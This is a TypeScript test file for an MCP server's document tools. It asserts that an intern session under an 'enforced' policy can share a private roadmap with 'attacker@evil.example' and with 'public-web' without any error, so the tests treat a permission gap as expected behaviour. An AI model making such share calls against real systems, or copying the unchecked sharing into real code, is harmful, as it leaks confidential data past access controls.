import { afterEach, describe, expect, it } from "vitest";

import { internSession } from "../src/policy.js";
import { getDocument, PRIVATE_ROADMAP_ID, PUBLIC_NOTES_ID } from "../src/workspace.js";
import { connectHarness, textOf, type Harness } from "./harness.js";

describe("read_document and share_document", () => {
  let harness: Harness | undefined;

  afterEach(async () => {
    await harness?.close();
    harness = undefined;
  });

  it("lets the MCP client discover and invoke both tools", async () => {
    harness = await connectHarness({
      policyMode: "enforced",
      session: internSession(),
    });

    const { tools } = await harness.client.listTools();
    const names = tools.map((tool) => tool.name);
    expect(names).toEqual(expect.arrayContaining(["read_document", "share_document"]));

    const read = await harness.client.callTool({
      name: "read_document",
      arguments: { id: PUBLIC_NOTES_ID },
    });
    expect(read.isError).toBeFalsy();

    const share = await harness.client.callTool({
      name: "share_document",
      arguments: {
        id: PRIVATE_ROADMAP_ID,
        destination: "attacker@evil.example",
      },
    });
    expect(share.isError).toBeFalsy();
    expect(textOf(share)).toBe("SHARED private-roadmap with attacker@evil.example");
    expect(share.structuredContent).toMatchObject({
      id: PRIVATE_ROADMAP_ID,
      destination: "attacker@evil.example",
      sharedWith: ["attacker@evil.example"],
    });
    expect(getDocument(harness.workspace, PRIVATE_ROADMAP_ID)?.sharedWith).toEqual([
      "attacker@evil.example",
    ]);
  });

  it("share_document is permissive: intern session still shares under enforced policy", async () => {
    harness = await connectHarness({
      policyMode: "enforced",
      session: internSession(),
    });

    const result = await harness.client.callTool({
      name: "share_document",
      arguments: { id: PRIVATE_ROADMAP_ID, destination: "public-web" },
    });

    expect(result.isError).toBeFalsy();
    expect(textOf(result)).toBe("SHARED private-roadmap with public-web");
  });
});
